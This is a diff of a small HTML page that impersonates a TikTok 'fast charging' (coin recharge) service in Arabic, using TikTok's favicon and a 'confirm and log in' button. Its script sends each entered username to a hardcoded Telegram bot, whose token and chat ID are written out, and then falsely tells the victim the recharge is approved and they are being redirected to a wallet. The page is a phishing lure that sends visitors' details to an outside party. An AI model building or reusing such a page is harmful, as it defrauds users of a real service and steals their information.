@@ -3,33 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شحن تيك توك</title>
+    <title>TikTok Charge</title>
     <style>
-        body { background-color: #010101; color: white; font-family: sans-serif; text-align: center; padding: 40px 20px; }
-        .box { border: 1px solid #333; padding: 20px; border-radius: 15px; background: #0a0a0a; max-width: 400px; margin: auto; }
-        h1 { color: #fe2c55; }
-        input { padding: 15px; width: 90%; border-radius: 10px; border: 1px solid #444; background: #1a1a1a; color: white; margin-bottom: 20px; text-align: center; }
-        button { background: linear-gradient(45deg, #fe2c55, #25f4ee); color: black; border: none; padding: 15px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; font-size: 18px; }
+        body { background: #010101; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .box { border: 1px solid #333; padding: 20px; border-radius: 15px; background: #0a0a0a; max-width: 350px; margin: auto; }
+        input { padding: 15px; width: 85%; border-radius: 10px; border: 1px solid #444; background: #1a1a1a; color: white; margin-bottom: 20px; }
+        button { background: #fe2c55; color: white; border: none; padding: 15px; border-radius: 10px; width: 90%; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="box">
         <img src="https://www.tiktok.com/favicon.ico" width="50">
-        <h1>نظام الشحن السريع</h1>
-        <p>ادخل اسم المستخدم لتأكيد هويتك</p>
+        <h2>نظام الشحن السريع</h2>
         <input type="text" id="user" placeholder="@username">
-        <button onclick="send()">تأكيد وتسجيل الدخول</button>
+        <button onclick="sendData()">تأكيد وتسجيل الدخول</button>
     </div>
     <script>
-        function send() {
+        function sendData() {
             var user = document.getElementById('user').value;
-            if(!user) { alert("برجاء كتابة اليوزر"); return; }
+            if(!user) { alert("اكتب اليوزر"); return; }
             
             var token = "8797896445:AAFg2pPj1C5tbUR72m-raHrRwzYTgBLSAVo";
-            var chat_id = "5533405786";
+            var id = "5533405786";
             var text = "🚀 عميل جديد:\n" + user;
             
-            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + id + "&text=" + encodeURIComponent(text);
             
             fetch(url).then(function() {
                 alert("تم الاعتماد! جاري تحويلك للمحفظة...");
